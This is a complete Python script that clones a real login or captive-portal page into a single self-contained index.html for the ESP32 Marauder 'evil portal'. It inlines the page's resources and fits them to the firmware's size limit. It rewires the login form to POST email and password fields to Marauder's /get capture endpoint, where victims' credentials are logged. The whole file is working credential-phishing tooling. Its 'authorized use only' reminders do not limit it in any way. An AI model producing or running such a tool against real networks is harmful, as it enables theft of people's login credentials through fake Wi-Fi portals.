#!/usr/bin/env python3
"""
clone_portal.py -- clone a target captive/landing page into a Marauder-ready portal.

Runs on your COMPUTER (not the board). Point it at the real page you're
authorized to mimic; it fetches the HTML, pulls in the linked resources
(CSS, images, favicon), inlines them into ONE self-contained file, rewires the
login form to Marauder's capture endpoint, minifies, and enforces Marauder's
size ceiling. The result is an `index.html` you drop on the board's SD card.

Marauder evil-portal contract (firmware v1.13.0), which this tool targets exactly:
  * ONE self-contained index.html on the SD-card root -- no external CSS/JS/img.
  * ~20 KB hard size budget (Marauder rejects/breaks on larger pages).
  * Marauder redirects every request to the portal, so remote resource URLs do
    NOT load on the twin -- everything the page needs must be inlined.
  * Credentials are captured from  <form method="POST" action="/get">  where the
    inputs are named  email  and  password . They land in evil_portal_x.log on
    the SD card and stream over serial.

Because of the 20 KB budget + captive redirect, a literal pixel-perfect clone of
a heavy site usually will NOT fit. This tool inlines what it can, then trims
(JS -> fonts -> largest images) until it's under budget, and tells you exactly
what it dropped. Tune with the flags below.

  python3 clone_portal.py --url http://portal.example.com/login \
      --ssid "Corp-Guest" --out index.html

  # keep original JavaScript, allow a looser budget:
  python3 clone_portal.py --url http://1.2.3.4/ --keep-js --max-bytes 30000

AUTHORIZED USE ONLY. Cloning a login page to harvest credentials is legal only
against systems you own or have explicit written permission to test.
"""

import argparse
import base64
import re
import sys
from urllib.parse import urljoin, urlparse
from urllib.request import Request, urlopen

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
MARAUDER_BUDGET = 20000  # bytes -- Marauder evil-portal single-file ceiling


def fetch(url, binary=False, timeout=15):
    """GET a URL. Returns (data, final_url, content_type). data is str unless binary."""
    req = Request(url, headers={"User-Agent": USER_AGENT})
    with urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
        final = resp.geturl()
        ctype = resp.headers.get("Content-Type", "")
    if binary:
        return raw, final, ctype
    charset = "utf-8"
    m = re.search(r"charset=([\w-]+)", ctype or "", re.I)
    if m:
        charset = m.group(1)
    return raw.decode(charset, errors="replace"), final, ctype


def guess_mime(url, ctype):
    if ctype and "/" in ctype:
        return ctype.split(";")[0].strip()
    ext = urlparse(url).path.lower().rsplit(".", 1)[-1] if "." in urlparse(url).path else ""
    return {
        "png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg",
        "gif": "image/gif", "svg": "image/svg+xml", "webp": "image/webp",
        "ico": "image/x-icon", "css": "text/css", "js": "application/javascript",
    }.get(ext, "application/octet-stream")


def to_data_uri(data, mime):
    return "data:{};base64,{}".format(mime, base64.b64encode(data).decode("ascii"))


class Cloner:
    def __init__(self, base_url, opts):
        self.base = base_url
        self.opts = opts
        self.dropped = []          # human-readable notes on what was trimmed
        self._img_cache = {}

    # -- resource inlining ------------------------------------------------
    def inline_image(self, ref, max_img=None):
        """Return a data: URI for an image ref, or None if it can't/shouldn't inline."""
        if ref.startswith("data:"):
            return ref
        url = urljoin(self.base, ref)
        if url in self._img_cache:
            return self._img_cache[url]
        try:
            data, final, ctype = fetch(url, binary=True)
        except Exception as e:
            self.dropped.append("image not fetched: {} ({})".format(ref, e))
            self._img_cache[url] = None
            return None
        cap = max_img if max_img is not None else self.opts.max_image
        if len(data) > cap:
            self.dropped.append("image too large, dropped: {} ({} B > {} B)".format(ref, len(data), cap))
            self._img_cache[url] = None
            return None
        uri = to_data_uri(data, guess_mime(url, ctype))
        self._img_cache[url] = uri
        return uri

    def inline_css_urls(self, css_text, css_base):
        """Inline small url(...) images referenced inside a stylesheet."""
        def repl(m):
            quote = m.group(1) or ""
            ref = m.group(2).strip()
            if ref.startswith("data:"):
                return m.group(0)
            abs_url = urljoin(css_base, ref)
            # skip fonts by default -- they blow the budget instantly
            if not self.opts.keep_fonts and re.search(r"\.(woff2?|ttf|otf|eot)(\?|$)", ref, re.I):
                self.dropped.append("font dropped from CSS: {}".format(ref))
                return "url()"
            uri = self.inline_image(abs_url, max_img=self.opts.max_css_image)
            if uri:
                return "url({}{}{})".format(quote, uri, quote)
            return "url()"
        return re.sub(r"url\(\s*(['\"]?)(.*?)\1\s*\)", repl, css_text)

    def fetch_stylesheets(self, html):
        """Pull <link rel=stylesheet> and inline them as <style> blocks."""
        styles = []
        for m in re.finditer(r'<link\b[^>]*rel=["\']?stylesheet["\']?[^>]*>', html, re.I):
            tag = m.group(0)
            href = re.search(r'href=["\']([^"\']+)["\']', tag, re.I)
            if not href:
                continue
            url = urljoin(self.base, href.group(1))
            try:
                css, final, _ = fetch(url)
            except Exception as e:
                self.dropped.append("stylesheet not fetched: {} ({})".format(href.group(1), e))
                continue
            css = self.inline_css_urls(css, final)
            styles.append(css)
        # strip the now-inlined <link> tags
        html = re.sub(r'<link\b[^>]*rel=["\']?stylesheet["\']?[^>]*>', "", html, flags=re.I)
        if styles:
            block = "<style>\n" + "\n".join(styles) + "\n</style>"
            if re.search(r"</head>", html, re.I):
                html = re.sub(r"</head>", block + "\n</head>", html, count=1, flags=re.I)
            else:
                html = block + html
        return html

    def inline_img_tags(self, html):
        def repl(m):
            tag = m.group(0)
            src = re.search(r'\bsrc=["\']([^"\']+)["\']', tag, re.I)
            if not src:
                return tag
            uri = self.inline_image(src.group(1))
            if uri:
                return tag[:src.start(1)] + uri + tag[src.end(1):]
            # unfetchable/too big -> drop the src so it degrades cleanly
            return tag[:src.start(1)] + "" + tag[src.end(1):]
        return re.sub(r"<img\b[^>]*>", repl, html, flags=re.I)

    def inline_favicon(self, html):
        def repl(m):
            tag = m.group(0)
            href = re.search(r'href=["\']([^"\']+)["\']', tag, re.I)
            if not href:
                return tag
            uri = self.inline_image(href.group(1), max_img=self.opts.max_css_image)
            if uri:
                return tag[:href.start(1)] + uri + tag[href.end(1):]
            return ""
        return re.sub(r'<link\b[^>]*rel=["\'][^"\']*icon[^"\']*["\'][^>]*>', repl, html, flags=re.I)

    def handle_scripts(self, html):
        if self.opts.keep_js:
            # inline external scripts
            def repl(m):
                tag = m.group(0)
                src = re.search(r'\bsrc=["\']([^"\']+)["\']', tag, re.I)
                if not src:
                    return tag
                try:
                    js, _, _ = fetch(urljoin(self.base, src.group(1)))
                except Exception:
                    return ""
                return "<script>\n{}\n</script>".format(js)
            return re.sub(r"<script\b[^>]*\bsrc=[^>]*>\s*</script>", repl, html, flags=re.I)
        # default: strip all scripts (smaller, and captive portals rarely need them)
        before = len(html)
        html = re.sub(r"<script\b.*?</script>", "", html, flags=re.I | re.S)
        html = re.sub(r"<script\b[^>]*>", "", html, flags=re.I)
        if len(html) != before:
            self.dropped.append("JavaScript stripped (use --keep-js to keep it)")
        return html

    # -- form rewiring ----------------------------------------------------
    def rewire_form(self, html):
        """Point the first login form at Marauder's /get endpoint and make sure the
        primary credential fields are named email/password so Marauder logs them."""
        forms = list(re.finditer(r"<form\b[^>]*>", html, re.I))
        if not forms:
            self.dropped.append("WARNING: no <form> found -- add one that POSTs to /get "
                                "with email/password inputs, or creds won't be captured")
            return html
        fm = forms[0]
        newtag = re.sub(r'\baction=["\'][^"\']*["\']', '', fm.group(0), flags=re.I)
        newtag = re.sub(r'\bmethod=["\'][^"\']*["\']', '', newtag, flags=re.I)
        newtag = newtag[:-1] + ' action="/get" method="POST">'
        html = html[:fm.start()] + newtag + html[fm.end():]

        # Ensure an email-ish and a password input carry the exact capture names.
        def ensure_name(pattern, name):
            nonlocal html
            m = re.search(pattern, html, re.I)
            if not m:
                return
            tag = m.group(0)
            if re.search(r'\bname=', tag, re.I):
                tag2 = re.sub(r'\bname=["\'][^"\']*["\']', 'name="{}"'.format(name), tag, flags=re.I)
            else:
                tag2 = tag[:-1] + ' name="{}">'.format(name)
            html = html[:m.start()] + tag2 + html[m.end():]

        ensure_name(r'<input\b[^>]*type=["\']password["\'][^>]*>', "password")
        # email/username field: prefer type=email, else the first text/tel/username input
        if re.search(r'<input\b[^>]*type=["\']email["\'][^>]*>', html, re.I):
            ensure_name(r'<input\b[^>]*type=["\']email["\'][^>]*>', "email")
        else:
            ensure_name(r'<input\b[^>]*type=["\'](?:text|tel)["\'][^>]*>', "email")
        return html

    # -- minify + budget --------------------------------------------------
    @staticmethod
    def minify(html):
        html = re.sub(r"<!--(?!\[if).*?-->", "", html, flags=re.S)   # keep IE conditionals
        html = re.sub(r">\s+<", "><", html)
        html = re.sub(r"[ \t]{2,}", " ", html)
        html = re.sub(r"\n{2,}", "\n", html)
        return html.strip()

    def enforce_budget(self, html, budget):
        """If over budget, drop the largest inlined data: images until it fits."""
        while len(html.encode("utf-8")) > budget:
            uris = list(re.finditer(r'data:image/[^"\')\s]+', html))
            if not uris:
                break
            biggest = max(uris, key=lambda x: len(x.group(0)))
            html = html[:biggest.start()] + "" + html[biggest.end():]
            self.dropped.append("inlined image removed to fit budget "
                                "({} B over)".format(len(html.encode("utf-8")) - budget))
        return html


def build(html, base_url, opts):
    c = Cloner(base_url, opts)
    html = c.handle_scripts(html)
    html = c.fetch_stylesheets(html)
    html = c.inline_favicon(html)
    html = c.inline_img_tags(html)
    html = c.rewire_form(html)
    if not opts.no_minify:
        html = c.minify(html)
    html = c.enforce_budget(html, opts.max_bytes)
    return html, c.dropped


def main():
    ap = argparse.ArgumentParser(description="Clone a captive/landing page into a Marauder evil-portal index.html")
    ap.add_argument("--url", required=True, help="URL of the page you are authorized to clone")
    ap.add_argument("--out", default="index.html", help="output file (default index.html)")
    ap.add_argument("--ssid", help="note only: the SSID you plan to broadcast (recorded in a comment)")
    ap.add_argument("--max-bytes", type=int, default=MARAUDER_BUDGET,
                    help="size budget in bytes (default {} = Marauder ceiling)".format(MARAUDER_BUDGET))
    ap.add_argument("--max-image", type=int, default=8000, help="max bytes per inlined <img> (default 8000)")
    ap.add_argument("--max-css-image", type=int, default=4000, help="max bytes per CSS/icon image (default 4000)")
    ap.add_argument("--keep-js", action="store_true", help="inline original JavaScript instead of stripping it")
    ap.add_argument("--keep-fonts", action="store_true", help="inline web fonts (usually blows the budget)")
    ap.add_argument("--no-minify", action="store_true", help="do not minify the output")
    args = ap.parse_args()

    print("[*] Fetching {}".format(args.url))
    try:
        html, final_url, _ = fetch(args.url)
    except Exception as e:
        sys.stderr.write("ERROR: could not fetch {}: {}\n".format(args.url, e))
        sys.exit(1)
    print("[*] Final URL: {}".format(final_url))

    out_html, dropped = build(html, final_url, args)

    header = "<!-- cloned from {} for AUTHORIZED testing".format(final_url)
    if args.ssid:
        header += " | intended SSID: {}".format(args.ssid)
    header += " -->\n"
    out_html = header + out_html

    with open(args.out, "w", encoding="utf-8") as f:
        f.write(out_html)

    size = len(out_html.encode("utf-8"))
    print("[*] Wrote {} ({} bytes)".format(args.out, size))
    if dropped:
        print("[*] Notes / trimmed to fit Marauder's constraints:")
        for d in dropped:
            print("      - {}".format(d))
    if size > args.max_bytes:
        print("[!] STILL OVER BUDGET ({} > {} bytes). Marauder may reject it.".format(size, args.max_bytes))
        print("    Try --max-image smaller, drop images, or hand-trim the HTML.")
    else:
        print("[*] Under budget ({} <= {} bytes). Rename to index.html on the SD root,".format(size, args.max_bytes))
        print("    or select it with `evilportal -c sethtml {}`.".format(args.out))
    print("[*] Reminder: the form now POSTs to /get with email/password -- verify those")
    print("    fields exist and look right before deploying. AUTHORIZED USE ONLY.")


if __name__ == "__main__":
    main()
